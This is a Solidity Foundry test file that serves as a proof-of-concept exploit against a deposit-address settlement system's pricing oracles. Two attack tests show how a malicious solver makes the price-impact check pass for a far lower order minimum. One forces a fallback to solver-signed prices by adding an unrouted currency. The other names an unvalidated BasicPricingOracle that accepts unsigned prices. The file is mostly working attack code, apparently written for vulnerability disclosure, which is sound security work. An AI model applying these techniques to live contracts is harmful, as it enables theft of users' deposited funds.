// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";

import {RelayDepositAddressManager} from "settlement/deposit-addresses/RelayDepositAddressManager.sol";
import {SignedPricingOracle} from "settlement/deposit-addresses/oracle/SignedPricingOracle.sol";
import {BasicPricingOracle} from "settlement/deposit-addresses/oracle/BasicPricingOracle.sol";
import {Currency, Price} from "settlement/deposit-addresses/oracle/IPricingOracle.sol";
import {RelayPriceOracle, IPriceFeedAdapter} from "settlement/RelayPriceOracle.sol";

/// @notice Dummy precompile code: any staticcall returns a non-empty payload.
contract PrecompileStub {
    fallback() external payable {
        assembly {
            mstore(0, 0x01)
            return(0, 32)
        }
    }
}

/// @notice Minimal price-feed adapter returning canned $1 prices for known feeds.
contract MockAdapter is IPriceFeedAdapter {
    address public immutable _oracle;
    mapping(bytes32 => uint256) public priceByFeed;

    constructor(address oracle_) {
        _oracle = oracle_;
    }

    function ORACLE() external view returns (address) {
        return _oracle;
    }

    function setPrice(bytes32 feedId, uint256 price) external {
        priceByFeed[feedId] = price;
    }

    function decodeAndVerify(
        bytes32 feedId,
        bytes calldata
    )
        external
        returns (
            uint256 usdPrice,
            uint256 bid,
            uint256 ask,
            uint8 usdPriceDecimals,
            uint256 publishTime
        )
    {
        if (msg.sender != _oracle) revert UnauthorizedCaller(msg.sender);
        usdPrice = priceByFeed[feedId];
        bid = usdPrice;
        ask = usdPrice;
        usdPriceDecimals = 8;
        publishTime = block.timestamp;
    }
}

/// @notice PoC: a malicious solver controls the prices bound into a deposit-address
/// trigger, defeating the Lit Action's price-impact check (the user's only
/// protection against a bait-and-switch on the order minimum).
///
/// Mechanism 1 (main): SignedPricingOracle falls back to SOLVER-signed prices
/// for the WHOLE batch when the on-chain query reverts for ANY currency. The
/// trigger caller picks `currencies` freely, so adding one unrouted currency
/// forces the fallback for every currency, including ones with live on-chain
/// prices. Nothing downstream can tell fallback prices from on-chain prices.
///
/// Mechanism 2: derivationFields.pricingOracle is an arbitrary caller-chosen
/// address, and nothing (on-chain manager, oracle attestation, Lit Action)
/// validates it. Naming a BasicPricingOracle lets the caller bind ANY prices
/// with no signature at all.
contract DepositPriceBypassTest is Test {
    RelayDepositAddressManager internal manager;
    RelayPriceOracle internal relayOracle;
    SignedPricingOracle internal signedOracle;
    BasicPricingOracle internal basicOracle;
    MockAdapter internal adapter;

    uint256 internal solverPk = 0xBEEF;
    address internal solver;
    address internal user = address(0xB0B);
    address internal usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address internal dai = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address internal bogusToken = address(0xB0675);

    bytes32 internal constant PROVIDER = keccak256("mock-provider");
    bytes32 internal constant FEED_USDC = keccak256("feed-usdc");
    bytes32 internal constant FEED_DAI = keccak256("feed-dai");

    // Deposit: 1000 USDC. Quoted minimum: 996 DAI (0.4% haircut, within 0.5% impact). Attack minimum: 100 DAI.
    uint256 internal constant DEPOSIT = 1000e6;
    uint256 internal constant QUOTED_MIN = 996e18;
    uint256 internal constant ATTACK_MIN = 100e18;
    uint256 internal constant PRICE_IMPACT_BPS = 50; // 0.5%

    function setUp() public {
        solver = vm.addr(solverPk);

        // Precompile stub so RelayPriceOracle reads succeed locally.
        PrecompileStub stub = new PrecompileStub();
        vm.etch(address(uint160(0x010002)), address(stub).code);

        relayOracle = new RelayPriceOracle(address(this));
        adapter = new MockAdapter(address(relayOracle));
        adapter.setPrice(FEED_USDC, 1e8); // $1.00, 8 decimals
        adapter.setPrice(FEED_DAI, 1e8);
        relayOracle.setPriceFeedAdapter(PROVIDER, address(adapter), 60);
        relayOracle.setFeedRoute(
            Currency({chainId: "1", currency: abi.encodePacked(usdc)}),
            PROVIDER,
            FEED_USDC,
            6,
            300
        );
        relayOracle.setFeedRoute(
            Currency({chainId: "1", currency: abi.encodePacked(dai)}),
            PROVIDER,
            FEED_DAI,
            18,
            300
        );

        signedOracle = new SignedPricingOracle(solver, address(relayOracle));
        basicOracle = new BasicPricingOracle();
        manager = new RelayDepositAddressManager();
    }

    // ---- Lit Action price-impact check, replicated verbatim from
    // packages/lit-deposit-address/src/attestation/index.ts (verifyOrderData) ----
    function _priceImpactPasses(
        uint256 inputAmount,
        Price memory inputPrice,
        uint256 outputMin,
        Price memory outputPrice,
        uint256 priceImpactBps
    ) internal pure returns (bool) {
        uint256 inputUsdScaled = inputAmount *
            inputPrice.usdPrice *
            (10 ** (outputPrice.usdPriceDecimals + outputPrice.currencyDecimals));
        uint256 outputUsdScaled = outputMin *
            outputPrice.usdPrice *
            (10 ** (inputPrice.usdPriceDecimals + inputPrice.currencyDecimals));
        // outputUsd >= inputUsd * (10000 - priceImpactBps) / 10000
        return outputUsdScaled * 10_000 >= inputUsdScaled * (10_000 - priceImpactBps);
    }

    function _input() internal view returns (RelayDepositAddressManager.Input memory) {
        return RelayDepositAddressManager.Input({
            vmType: "ethereum-vm",
            chainId: "1",
            currency: abi.encodePacked(usdc),
            amount: DEPOSIT
        });
    }

    function _derivation(address oracle) internal view returns (RelayDepositAddressManager.DerivationFields memory) {
        return RelayDepositAddressManager.DerivationFields({
            inputVmType: "ethereum-vm",
            outputVmType: "ethereum-vm",
            outputChainId: "1",
            outputCurrency: abi.encodePacked(dai),
            outputRecipient: abi.encodePacked(user),
            solver: solver,
            pricingOracle: oracle,
            depositor: abi.encodePacked(user),
            refundRecipient: abi.encodePacked(user),
            priceImpactBps: PRICE_IMPACT_BPS,
            salt: 12345
        });
    }

    function _signPrice(
        SignedPricingOracle.SignedPrice memory p
    ) internal view returns (bytes memory) {
        bytes32 digest = signedOracle.hashSignedPrice(p);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(solverPk, digest);
        return abi.encodePacked(r, s, v);
    }

    /// @notice CONTROL: with only routed currencies, the on-chain $1/$1 prices
    /// are used and the Lit price-impact check REJECTS the 100 DAI attack minimum.
    function test_control_onchainPricesRejectAttackMinimum() public {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = Currency({chainId: "1", currency: abi.encodePacked(usdc)});
        currencies[1] = Currency({chainId: "1", currency: abi.encodePacked(dai)});

        bytes32 orderId = keccak256("attack-order");
        vm.prank(solver);
        manager.trigger(_input(), _derivation(address(signedOracle)), orderId, 1, currencies, "");

        // The prices the trigger bound are the on-chain ones ($1 / $1).
        Price memory inP = Price({
            usdPrice: 1e8,
            usdPriceDecimals: 8,
            currencyDecimals: 6,
            publishTime: block.timestamp,
            expiration: block.timestamp + 300
        });
        Price memory outP = Price({
            usdPrice: 1e8,
            usdPriceDecimals: 8,
            currencyDecimals: 18,
            publishTime: block.timestamp,
            expiration: block.timestamp + 300
        });
        assertFalse(_priceImpactPasses(DEPOSIT, inP, ATTACK_MIN, outP, PRICE_IMPACT_BPS));
        assertTrue(_priceImpactPasses(DEPOSIT, inP, QUOTED_MIN, outP, PRICE_IMPACT_BPS));
        console.log("CONTROL: honest on-chain prices reject the 100 DAI attack minimum");
    }

    /// @notice ATTACK (mechanism 1): one extra unrouted currency forces the
    /// whole batch onto solver-signed prices. The solver signs USDC=$0.05 and
    /// DAI=$10, so the Lit price-impact check PASSES for the 100 DAI minimum
    /// (which is worth $100 against a $1000 deposit).
    function test_attack_forcedFallbackPassesAttackMinimum() public {
        Currency[] memory currencies = new Currency[](3);
        currencies[0] = Currency({chainId: "1", currency: abi.encodePacked(usdc)});
        currencies[1] = Currency({chainId: "1", currency: abi.encodePacked(dai)});
        currencies[2] = Currency({chainId: "1", currency: abi.encodePacked(bogusToken)});

        // Solver-signed manipulated prices, far-future expiration.
        SignedPricingOracle.SignedPrice[] memory signed = new SignedPricingOracle.SignedPrice[](3);
        signed[0] = SignedPricingOracle.SignedPrice({
            chainId: "1",
            currency: abi.encodePacked(usdc),
            usdPrice: 5e6, // $0.05 (real: $1.00)
            usdPriceDecimals: 8,
            currencyDecimals: 6,
            publishTime: block.timestamp,
            expiration: block.timestamp + 365 days,
            signature: ""
        });
        signed[1] = SignedPricingOracle.SignedPrice({
            chainId: "1",
            currency: abi.encodePacked(dai),
            usdPrice: 1e9, // $10.00 (real: $1.00)
            usdPriceDecimals: 8,
            currencyDecimals: 18,
            publishTime: block.timestamp,
            expiration: block.timestamp + 365 days,
            signature: ""
        });
        signed[2] = SignedPricingOracle.SignedPrice({
            chainId: "1",
            currency: abi.encodePacked(bogusToken),
            usdPrice: 1e8,
            usdPriceDecimals: 8,
            currencyDecimals: 18,
            publishTime: block.timestamp,
            expiration: block.timestamp + 365 days,
            signature: ""
        });
        for (uint256 i; i < 3; ++i) {
            signed[i].signature = _signPrice(signed[i]);
        }

        bytes32 orderId = keccak256("attack-order");
        vm.prank(solver);
        manager.trigger(
            _input(),
            _derivation(address(signedOracle)),
            orderId,
            1,
            currencies,
            abi.encode(signed)
        );

        // Trigger recorded on-chain (oracle attestation only checks this).
        // Recompute the trigger hash the same way the manager does.
        Price[] memory boundPrices = new Price[](3);
        boundPrices[0] = Price(5e6, 8, 6, block.timestamp, block.timestamp + 365 days);
        boundPrices[1] = Price(1e9, 8, 18, block.timestamp, block.timestamp + 365 days);
        boundPrices[2] = Price(1e8, 8, 18, block.timestamp, block.timestamp + 365 days);
        bytes32 triggerHash = keccak256(
            abi.encode(
                _input(),
                _derivation(address(signedOracle)),
                orderId,
                uint256(1),
                currencies,
                boundPrices,
                abi.encode(signed)
            )
        );
        assertEq(manager.triggers(triggerHash), orderId);

        // Lit Action price-impact check now PASSES for the 100 DAI minimum:
        // input "worth" $50, output "worth" $1000.
        assertTrue(_priceImpactPasses(DEPOSIT, boundPrices[0], ATTACK_MIN, boundPrices[1], PRICE_IMPACT_BPS));
        console.log("ATTACK 1: forced fallback -> manipulated prices bound; impact check passes for 100 DAI vs $1000 deposit");
    }

    /// @notice ATTACK (mechanism 2): naming a BasicPricingOracle in the
    /// derivation fields lets the trigger caller bind ANY prices with NO
    /// signature at all. Nothing downstream validates which oracle was used.
    function test_attack_basicOracleNeedsNoSignature() public {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = Currency({chainId: "1", currency: abi.encodePacked(usdc)});
        currencies[1] = Currency({chainId: "1", currency: abi.encodePacked(dai)});

        Price[] memory prices = new Price[](2);
        prices[0] = Price(5e6, 8, 6, block.timestamp, block.timestamp + 365 days); // USDC $0.05
        prices[1] = Price(1e9, 8, 18, block.timestamp, block.timestamp + 365 days); // DAI $10

        bytes32 orderId = keccak256("attack-order");
        vm.prank(solver);
        manager.trigger(
            _input(),
            _derivation(address(basicOracle)),
            orderId,
            1,
            currencies,
            abi.encode(prices)
        );

        bytes32 triggerHash = keccak256(
            abi.encode(
                _input(),
                _derivation(address(basicOracle)),
                orderId,
                uint256(1),
                currencies,
                prices,
                abi.encode(prices)
            )
        );
        assertEq(manager.triggers(triggerHash), orderId);
        assertTrue(_priceImpactPasses(DEPOSIT, prices[0], ATTACK_MIN, prices[1], PRICE_IMPACT_BPS));
        console.log("ATTACK 2: BasicPricingOracle -> arbitrary prices bound with zero signatures; impact check passes");
    }
}
